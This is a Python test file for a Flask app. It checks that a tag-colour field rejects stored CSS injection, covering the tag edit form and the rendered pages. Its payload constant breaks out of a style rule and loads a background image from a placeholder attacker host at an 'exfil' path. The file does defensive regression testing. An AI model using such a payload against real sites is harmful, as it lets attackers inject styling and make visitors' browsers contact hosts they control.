#!/usr/bin/env python3
"""
Tag colour is rendered into a <style> block, so it must only ever be a hex colour.

Anything else is stored CSS injection (GHSA-4j9m-cxq4-9c36) - Jinja2's HTML autoescaping
does not protect a CSS context, the payload below needs none of the characters it escapes.

Covers the three ways a colour can be set/rendered:
 - the tag edit form
 - the API (PUT and POST)
 - rendering a value already in the datastore (from before this was validated)
"""

import json
from flask import url_for
from .util import get_UUID_for_tag_name

CSS_INJECTION = 'red} *{background-image:url(https://attacker.example.com/exfil)} .x{color:'


def _add_tag(client, name):
    res = client.post(url_for("tags.form_tag_add"), data={"name": name}, follow_redirects=True)
    assert b"Tag added" in res.data
    return get_UUID_for_tag_name(client, name=name)


def test_tag_colour_form_rejects_css_injection(client, live_server, measure_memory_usage, datastore_path):
    tag_uuid = _add_tag(client, "css-injection-tag")

    res = client.post(
        url_for("tags.form_tag_edit_submit", uuid=tag_uuid),
        data={"name": "css-injection-tag", "tag_colour": CSS_INJECTION},
        follow_redirects=True
    )
    assert b"Updated" not in res.data
    assert b"Must be a hex colour" in res.data

    datastore = client.application.config.get('DATASTORE')
    assert not datastore.data['settings']['application']['tags'][tag_uuid].get('tag_colour')

    # ..and it never reaches the stylesheet on either page that renders tag colours
    for page in (url_for("watchlist.index"), url_for("tags.tags_overview_page")):
        assert b"attacker.example.com" not in client.get(page).data


